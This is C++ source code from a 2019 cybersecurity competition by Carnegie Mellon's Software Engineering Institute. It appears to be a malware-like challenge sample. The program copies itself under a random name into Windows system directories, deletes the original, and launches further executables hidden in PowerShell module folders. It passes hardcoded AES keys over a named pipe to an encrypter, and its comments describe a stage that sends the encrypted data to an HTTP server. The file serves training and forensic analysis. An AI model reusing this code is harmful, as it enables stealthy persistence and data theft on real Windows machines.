/*
President's Cup Cybersecurity Competition 2019 Challenges

Copyright 2020 Carnegie Mellon University.

NO WARRANTY. THIS CARNEGIE MELLON UNIVERSITY AND SOFTWARE ENGINEERING
INSTITUTE MATERIAL IS FURNISHED ON AN "AS-IS" BASIS. CARNEGIE MELLON
UNIVERSITY MAKES NO WARRANTIES OF ANY KIND, EITHER EXPRESSED OR
IMPLIED, AS TO ANY MATTER INCLUDING, BUT NOT LIMITED TO, WARRANTY OF
FITNESS FOR PURPOSE OR MERCHANTABILITY, EXCLUSIVITY, OR RESULTS
OBTAINED FROM USE OF THE MATERIAL. CARNEGIE MELLON UNIVERSITY DOES NOT
MAKE ANY WARRANTY OF ANY KIND WITH RESPECT TO FREEDOM FROM PATENT,
TRADEMARK, OR COPYRIGHT INFRINGEMENT.

Released under a MIT (SEI)-style license, please see license.txt or
contact permission@sei.cmu.edu for full terms.

[DISTRIBUTION STATEMENT A] This material has been approved for public
release and unlimited distribution.  Please see Copyright notice for
non-US Government use and distribution.

DM20-0347

---

Objective: This file self-replicates, and then spawns the new file as a copy.
		   That copy then kills the parent and goes on to launch two more executables.
*/

#include <iostream>
#include <Windows.h>
#include <conio.h>
#include <atlconv.h>
#include <atlbase.h>
#include <stdio.h>
#include <stdlib.h>
#include <tchar.h>
#include <string.h>
#include <random>


#define BUFSIZE 512
#define BUFSIZE_TWO 1024

// global buffer used for passing text between encrypter and evil_messenger:
std::string global_buffer;

using namespace std;


// Functions:
void initiate();
void launch_two(char* pipe);
void launch_three();
void server_communication_pipe(char* message, char* pipe_name);
string server_receive_pipe();



int main(void) {

	// Replicate:
	initiate();

	return 0;
}

// Takes no arguments. Creates a new copy of its own .exe file, spawns it.
void initiate()
{
	/*
		sanity check to make sure that this part of the function is ONLY invoked if this is
		the initial executable, called "origins.exe"
	*/

	char proc_path[MAX_PATH];						// path to process's own .exe file 
	GetModuleFileNameA(NULL, proc_path, MAX_PATH);	// retrieves full pathname of process's executable
	string proc_name = proc_path;
	
	/* current process is the original exe: */
	if (proc_name.find("origins.exe") != std::string::npos)
	{	
		HANDLE new_file = CreateFile("uFBOQY_h6aYMT.exe", GENERIC_WRITE, 0, NULL, CREATE_NEW,
			FILE_ATTRIBUTE_NORMAL, NULL);

		if (new_file == INVALID_HANDLE_VALUE)
		{
			ExitProcess(0);
		}

		// read whatever's in the source file:
		HANDLE read_handle = CreateFileA(proc_path, GENERIC_READ, 0, NULL, OPEN_EXISTING,
			FILE_ATTRIBUTE_NORMAL, NULL);

		if (read_handle == INVALID_HANDLE_VALUE)
		{
			ExitProcess(0);
		}

		LARGE_INTEGER fsize;    // file size
		BOOL errFlag = false;   // flag to check if operations are working
		GetFileSizeEx(read_handle, &fsize);
		char* buffer_one = (char*)malloc(fsize.QuadPart);
		DWORD bytesToWrite = (DWORD)fsize.QuadPart;
		DWORD bytesWritten = 0;

		errFlag = ReadFile(read_handle, buffer_one, bytesToWrite, &bytesWritten, NULL);

		if (!errFlag)
		{
		}

		// second memory buffer used to actually write to newly created file:
		char* buffer_two = (char*)malloc(fsize.QuadPart);

		// read file data from buffer 1 to buffer 2:
		memcpy(buffer_two, buffer_one, bytesToWrite);

		errFlag = WriteFile(new_file, buffer_two, bytesToWrite, &bytesWritten, NULL);

		if (!errFlag)
		{
		}
		else
		{
		}
		
		// perform clean up: 
		CloseHandle(new_file);
		CloseHandle(read_handle);
		free(buffer_one);
		free(buffer_two);
		
		// move replicant.exe into a random directory:
		
		const char* dir[4] = 
		{ 
			"C:\\Windows\\Registration\\CRMLog\\",
			"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\",
			"C:\\Program Files (x86)\\Windows NT\\Accessories\\",
			"C:\\Program Files\\Internet Explorer\\" 
		}; 

		/* randomly choose one the four directories to move replicant.exe into: */
		std::random_device rd;
		std::mt19937 eng(rd());
		std::uniform_int_distribution<> distr(0, 3);
		int random = distr(eng);
		const char* rand_dir = dir[random];

		char new_dir[MAX_PATH] = "";
		strncat_s(new_dir, rand_dir, MAX_PATH);
		strncat_s(new_dir, "uFBOQY_h6aYMT.exe", MAX_PATH);
		std::rename("uFBOQY_h6aYMT.exe", new_dir);
		
		/* create the process replicant.exe and dettach it: */
		STARTUPINFOA sinfo;
		PROCESS_INFORMATION pinfo;
		ZeroMemory(&sinfo, sizeof(sinfo));
		sinfo.cb = sizeof(sinfo);
		ZeroMemory(&pinfo, sizeof(pinfo));
		
		if (!
			CreateProcessA(NULL, (LPSTR) ((string) new_dir).c_str(), NULL, NULL, true, 
				NORMAL_PRIORITY_CLASS, NULL, (LPSTR) ((string) rand_dir).c_str(), &sinfo, &pinfo))
		{
		}
		else
		{
		}	

		// once the replicant has been created and launched, exits process:
		ExitProcess(0);
	}

	/* current process is the self-replicated copy: */
	else if ((proc_name.find("uFBOQY_h6aYMT.exe") != std::string::npos))
	{
		// delete the original file:
		string original = "origins.exe";
		if (!DeleteFileA(original.c_str()))
		{
		}
			   
		/* 
			Launch a second and third executable. Communicate via 
			IPC (named pipes).
		*/

		char pipe[] = "\\\\.\\pipe\\L_VGjLwz_L4zd8";
		launch_two(pipe);
		launch_three();

		ExitProcess(0);
	}
}


void launch_two(char* pipe_name)
{
	/*
		Launches the second executable and passes it three random 32-bit strings.
		The middle string is a base64 Windows directory, and what will be used as
		the root directory from which three random directories are chosen.
	*/
	
	/* 
		32-bit keys used for AES 256:
		key one =	"DX09Z8XorMsjAEQk4jCsPGRvM3TMZHKa"
		key two =	"QzpcXFdpbmRvd3NcXFN5c1dPVzY0XFwq"	// this is actually: "C:\\Windows\\SysWOW64\\*"
		key three = "jWkfCMtlHhumyuHdTR5P32xLbfjT2SXi"
	*/

	char aes_keys[] = "DX09Z8XorMsjAEQk4jCsPGRvM3TMZHKaQzpcXFdpbmRvd3NcXFN5c1dPVzY0XFwqjWkfCMtlHhumyuHdTR5P32xLbfjT2SXi";
	
	/* Launch the second process: */
	STARTUPINFOA sinfo;
	PROCESS_INFORMATION pinfo;
	ZeroMemory(&sinfo, sizeof(sinfo));
	ZeroMemory(&pinfo, sizeof(pinfo));
	sinfo.cb = sizeof(sinfo);

	char second_proc[MAX_PATH] = "C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\";

	char second_exe[MAX_PATH] = "C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\NoufUNUwRk4tg.exe";

	if (!
		CreateProcessA(NULL, second_exe, NULL, NULL, false,
			NORMAL_PRIORITY_CLASS, NULL, second_proc, &sinfo, &pinfo))
	{
	}


	// Send the keys to the encryption exe: 
	server_communication_pipe(aes_keys, pipe_name);

	// Open up a client pipe and grab response from the encryption executable:
	string response = server_receive_pipe();
	global_buffer = response;
	
}


void launch_three()
{
	/* 
		Launches the third executable which deals with sending the encrypted 
		data to the HTTP server (via PowerShell exploit).
	*/

	char third_proc[MAX_PATH] = "C:\\Program Files (x86)\\WindowsPowerShell\\Modules\\PowerShellGet\\1.0.0.1\\";

	char third_exe[MAX_PATH] = "C:\\Program Files (x86)\\WindowsPowerShell\\Modules\\PowerShellGet\\1.0.0.1\\YurCp6gbcJ_pP.exe";


	STARTUPINFOA sinfo;
	PROCESS_INFORMATION pinfo;
	ZeroMemory(&sinfo, sizeof(sinfo));
	sinfo.cb = sizeof(sinfo);
	ZeroMemory(&pinfo, sizeof(pinfo));

	if (!
		CreateProcessA(NULL, (LPSTR)((string)third_exe).c_str(), NULL, NULL, false,
			NORMAL_PRIORITY_CLASS, NULL, (LPSTR)((string)third_proc).c_str(), &sinfo, &pinfo))
	{
	}
	else
	{
	}

	return;
}


void server_communication_pipe(char* bytes_to_send, char* pipe_name)
{
	USES_CONVERSION;

	while (true)
	{
		HANDLE hpipe = CreateNamedPipe(CA2T(pipe_name), PIPE_ACCESS_INBOUND |
			PIPE_ACCESS_OUTBOUND, PIPE_WAIT, 1, BUFSIZE, 
			BUFSIZE, 5000, NULL);

		if (hpipe == INVALID_HANDLE_VALUE)
		{
		}

		char* data = bytes_to_send;
		DWORD read;

		if (!ConnectNamedPipe(hpipe, 0))
		{
		}

		WriteFile(hpipe, data, BUFSIZE, &read, NULL);

		if (read > 0)
		{
		}

		DisconnectNamedPipe(hpipe);
		CloseHandle(hpipe);
		break;
	}

}


string server_receive_pipe()
{
	/*
		Receives encrypted directory and the associated key index from
		encrypter.exe
	*/

	USES_CONVERSION;

	char buffer[BUFSIZE_TWO];

	while (true)
	{
		HANDLE hpipe = CreateNamedPipe(CA2T("\\\\.\\pipe\\L_VGjLwz_L4zd8"), PIPE_ACCESS_INBOUND |
			PIPE_ACCESS_OUTBOUND, PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, BUFSIZE, BUFSIZE, 0, NULL);

		if (hpipe == INVALID_HANDLE_VALUE)
		{
		}

		DWORD read;

		if (!ConnectNamedPipe(hpipe, 0))
		{
		}

		ReadFile(hpipe, buffer, BUFSIZE_TWO, &read, NULL);

		if (read > 0)
		{
		}

		DisconnectNamedPipe(hpipe);
		CloseHandle(hpipe);
		break;
	}

	return (string) buffer;

}
